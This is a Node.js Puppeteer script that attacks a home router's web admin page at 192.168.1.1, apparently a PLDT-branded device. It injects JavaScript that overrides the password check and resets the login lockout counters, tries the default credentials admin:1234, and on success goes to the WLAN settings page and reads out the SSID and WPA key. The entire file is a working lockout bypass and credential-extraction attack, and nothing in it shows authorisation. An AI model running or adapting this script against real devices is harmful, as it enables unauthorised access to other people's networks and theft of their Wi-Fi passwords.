// Try admin:1234 on the router over LAN, bypass overlay, extract WiFi password
const PUPPETEER = require('puppeteer');
const ROUTER = 'https://192.168.1.1';
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

(async () => {
  const b = await PUPPETEER.launch({headless: false, ignoreHTTPSErrors: true, args: ['--no-sandbox', '--ignore-certificate-errors', '--window-size=1280,720']});
  const p = await b.newPage();

  // Monitor network
  p.on('request', req => {
    if (req.url().includes('login.cgi')) console.log('login POST data:', req.postData());
  });

  // Load login page
  await p.goto(ROUTER + '/admin.html', {waitUntil: 'domcontentloaded', ignoreHTTPSErrors: true});
  await sleep(2000);

  // Wait for page to fully load
  await sleep(5000);

  // Check all frames for login fields
  for (const f of p.frames()) {
    const fi = await f.evaluate(() => {
      const inputs = Array.from(document.querySelectorAll('input')).map(i => ({id: i.id, name: i.name, type: i.type}));
      const html = document.body ? document.body.innerHTML.substring(0, 500) : 'no body';
      return {url: window.location.href, inputs, html: html.substring(0, 300)};
    }).catch(() => null);
    if (fi && fi.inputs && fi.inputs.length > 0) {
      console.log('Found inputs in frame:', fi.url, 'Inputs:', JSON.stringify(fi.inputs));
    }
  }

  // Dump main page structure
  const pageInfo = await p.evaluate(() => {
    const inputs = Array.from(document.querySelectorAll('input')).map(i => ({id: i.id, name: i.name, type: i.type, placeholder: i.placeholder}));
    const buttons = Array.from(document.querySelectorAll('button, input[type=button], input[type=submit]')).map(b => ({id: b.id, text: b.value || b.innerText, onclick: b.getAttribute('onclick')}));
    const bodyChildCount = document.body ? document.body.children.length : -1;
    const docType = document.doctype ? document.doctype.name : 'none';
    const bodyHtml = document.body ? document.body.innerHTML.substring(0, 2000) : 'no body';
    return {inputs, buttons, url: window.location.href, bodyChildCount, docType, html: bodyHtml};
  });
  console.log('Page info:', JSON.stringify(pageInfo, null, 2));

  // Inject bypass BEFORE typing credentials
  await p.evaluate(() => {
    window.CheckPassword = () => 0;
    window.setDisable = () => {};
    window.DisplayWifiPldt = () => {};
    window.BandSteeringState = () => {};
    window.LockLeftTime = 0;
    window.FailStat = '0';
    window.LoginTimes = 0;
  });

  // Try admin:1234 using the first available username/password fields
  await p.evaluate(() => {
    const uname = document.querySelector('input#txt_Username, input[name=UserName], input[name=username], input[placeholder*=Account], input[placeholder*=Username]');
    const pwd = document.querySelector('input#txt_Password, input[name=PassWord], input[name=password], input[placeholder*=assword], input[type=password]');
    if (uname) uname.value = 'admin';
    if (pwd) pwd.value = '1234';
    console.log('Found inputs:', !!uname, !!pwd);
  });
  await sleep(500);
  await p.evaluate(() => document.getElementById('button').click());
  await sleep(5000);

  console.log('Post-login URL:', p.url());
  let pageText = await p.evaluate(() => document.body.innerText.substring(0, 200));
  console.log('Page text:', pageText);

  // If we got past login, navigate to WiFi settings
  if (!p.url().includes('admin.html') || !pageText.includes('Account')) {
    console.log('Login might have worked - checking WiFi page...');
    await p.goto(ROUTER + '/html/bbsp/wlanbasicsetting/WlanBasicSetRpm.asp', {waitUntil: 'domcontentloaded', ignoreHTTPSErrors: true});
    await sleep(2000);
    pageText = await p.evaluate(() => document.body.innerText.substring(0, 500));
    console.log('WiFi page:', pageText);
    
    // Get WiFi password from input fields
    const wifiVals = await p.evaluate(() => {
      const wpa = document.querySelector('input[name=WPAKey]') || document.querySelector('input[id=wpa_key]') || document.querySelector('input[id$=WPAKey]');
      const ssid24 = document.querySelector('input[name=ssid]') || document.querySelector('input[id=ssid1]');
      const ssid5g = document.querySelector('input[name=ssid5]') || document.querySelector('input[id=ssid5]');
      return {
        ssid24: ssid24 ? ssid24.value : null,
        wpaKey: wpa ? wpa.value : null,
        url: window.location.href
      };
    });
    console.log('WiFi values:', JSON.stringify(wifiVals));
  } else {
    console.log('Login failed - still on admin page');
  }

  await sleep(5000);
  await b.close();
})();
